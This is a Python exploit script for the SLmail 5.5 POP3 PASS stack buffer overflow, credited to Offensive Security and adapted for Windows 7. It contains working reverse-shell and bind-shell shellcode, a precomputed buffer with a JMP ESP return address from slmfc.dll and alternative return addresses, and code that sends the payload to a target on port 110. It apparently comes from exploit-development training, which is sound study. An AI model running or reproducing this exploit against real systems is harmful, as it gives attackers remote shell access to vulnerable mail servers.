#########################################################
#                                                       #
# SLmail 5.5 POP3 PASS Buffer Overflow               	#
# Discovered by : Muts (Offensive Security              #
# Fixed for Win7 x86 by : Laurence Dale (@LD_RONIN)     #
# Plain vanilla stack overflow in the PASS command	#
# Exploit spawns a bind shell on target TCP 4444	#
# Reverse Shell Port 443 to ip 192.168.56.102 provided  #
# Modify code if required.				#
#                                                       #
#########################################################

import struct
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xb8\xf5\xab\x70\xd4\xdb\xca\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x42\x12\x03\x42\x12\x83\x1f\x57\x92\x21\x23\x40\xd1"
"\xca\xdb\x91\xb6\x43\x3e\xa0\xf6\x30\x4b\x93\xc6\x33\x19\x18"
"\xac\x16\x89\xab\xc0\xbe\xbe\x1c\x6e\x99\xf1\x9d\xc3\xd9\x90"
"\x1d\x1e\x0e\x72\x1f\xd1\x43\x73\x58\x0c\xa9\x21\x31\x5a\x1c"
"\xd5\x36\x16\x9d\x5e\x04\xb6\xa5\x83\xdd\xb9\x84\x12\x55\xe0"
"\x06\x95\xba\x98\x0e\x8d\xdf\xa5\xd9\x26\x2b\x51\xd8\xee\x65"
"\x9a\x77\xcf\x49\x69\x89\x08\x6d\x92\xfc\x60\x8d\x2f\x07\xb7"
"\xef\xeb\x82\x23\x57\x7f\x34\x8f\x69\xac\xa3\x44\x65\x19\xa7"
"\x02\x6a\x9c\x64\x39\x96\x15\x8b\xed\x1e\x6d\xa8\x29\x7a\x35"
"\xd1\x68\x26\x98\xee\x6a\x89\x45\x4b\xe1\x24\x91\xe6\xa8\x20"
"\x56\xcb\x52\xb1\xf0\x5c\x21\x83\x5f\xf7\xad\xaf\x28\xd1\x2a"
"\xcf\x02\xa5\xa4\x2e\xad\xd6\xed\xf4\xf9\x86\x85\xdd\x81\x4c"
"\x55\xe1\x57\xc2\x05\x4d\x08\xa3\xf5\x2d\xf8\x4b\x1f\xa2\x27"
"\x6b\x20\x68\x40\x06\xdb\xfb\xaf\x7f\xdb\x9d\x47\x82\x1b\x63"
"\x23\x0b\xfd\x09\x43\x5a\x56\xa6\xfa\xc7\x2c\x57\x02\xd2\x49"
"\x57\x88\xd1\xae\x16\x79\x9f\xbc\xcf\x89\xea\x9e\x46\x95\xc0"
"\xb6\x05\x04\x8f\x46\x43\x35\x18\x11\x04\x8b\x51\xf7\xb8\xb2"
"\xcb\xe5\x40\x22\x33\xad\x9e\x97\xba\x2c\x52\xa3\x98\x3e\xaa"
"\x2c\xa5\x6a\x62\x7b\x73\xc4\xc4\xd5\x35\xbe\x9e\x8a\x9f\x56"
"\x66\xe1\x1f\x20\x67\x2c\xd6\xcc\xd6\x99\xaf\xf3\xd7\x4d\x38"
"\x8c\x05\xee\xc7\x47\x8e\x1e\x82\xc5\xa7\xb6\x4b\x9c\xf5\xda"
"\x6b\x4b\x39\xe3\xef\x79\xc2\x10\xef\x08\xc7\x5d\xb7\xe1\xb5"
"\xce\x52\x05\x69\xee\x76")

bindshellcode = ("\xbd\x04\xa7\xc8\xa3\xdb\xd3\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x53\x31\x68\x12\x83\xc0\x04\x03\x6c\xa9\x2a\x56\x90\x5d\x28"
"\x99\x68\x9e\x4d\x13\x8d\xaf\x4d\x47\xc6\x80\x7d\x03\x8a\x2c"
"\xf5\x41\x3e\xa6\x7b\x4e\x31\x0f\x31\xa8\x7c\x90\x6a\x88\x1f"
"\x12\x71\xdd\xff\x2b\xba\x10\xfe\x6c\xa7\xd9\x52\x24\xa3\x4c"
"\x42\x41\xf9\x4c\xe9\x19\xef\xd4\x0e\xe9\x0e\xf4\x81\x61\x49"
"\xd6\x20\xa5\xe1\x5f\x3a\xaa\xcc\x16\xb1\x18\xba\xa8\x13\x51"
"\x43\x06\x5a\x5d\xb6\x56\x9b\x5a\x29\x2d\xd5\x98\xd4\x36\x22"
"\xe2\x02\xb2\xb0\x44\xc0\x64\x1c\x74\x05\xf2\xd7\x7a\xe2\x70"
"\xbf\x9e\xf5\x55\xb4\x9b\x7e\x58\x1a\x2a\xc4\x7f\xbe\x76\x9e"
"\x1e\xe7\xd2\x71\x1e\xf7\xbc\x2e\xba\x7c\x50\x3a\xb7\xdf\x3d"
"\x8f\xfa\xdf\xbd\x87\x8d\xac\x8f\x08\x26\x3a\xbc\xc1\xe0\xbd"
"\xc3\xfb\x55\x51\x3a\x04\xa6\x78\xf9\x50\xf6\x12\x28\xd9\x9d"
"\xe2\xd5\x0c\x0b\xea\x70\xff\x2e\x17\xc2\xaf\xee\xb7\xab\xa5"
"\xe0\xe8\xcc\xc5\x2a\x81\x65\x38\xd5\xbc\x29\xb5\x33\xd4\xc1"
"\x93\xec\x40\x20\xc0\x24\xf7\x5b\x22\x1d\x9f\x14\x24\x9a\xa0"
"\xa4\x62\x8c\x36\x2f\x61\x08\x27\x30\xac\x38\x30\xa7\x3a\xa9"
"\x73\x59\x3a\xe0\xe3\xfa\xa9\x6f\xf3\x75\xd2\x27\xa4\xd2\x24"
"\x3e\x20\xcf\x1f\xe8\x56\x12\xf9\xd3\xd2\xc9\x3a\xdd\xdb\x9c"
"\x07\xf9\xcb\x58\x87\x45\xbf\x34\xde\x13\x69\xf3\x88\xd5\xc3"
"\xad\x67\xbc\x83\x28\x44\x7f\xd5\x34\x81\x09\x39\x84\x7c\x4c"
"\x46\x29\xe9\x58\x3f\x57\x89\xa7\xea\xd3\xb9\xed\xb6\x72\x52"
"\xa8\x23\xc7\x3f\x4b\x9e\x04\x46\xc8\x2a\xf5\xbd\xd0\x5f\xf0"
"\xfa\x56\x8c\x88\x93\x32\xb2\x3f\x93\x16")

buffer = '\x41' * 2606 + struct.pack('<L', 0x5f4a358f) + '\x90' * 32 + bindshellcode 
#nasm jump esp 0x5f4a358f (slmfc.dll)
#ret candidates 0x5f4b5e2b, 0x5f4b66db, 0x5f4b6b23, 0x5f4b775b, 0x5f4bb173

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.56.103',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone!"
except:
	print "Could not connect to POP3!"

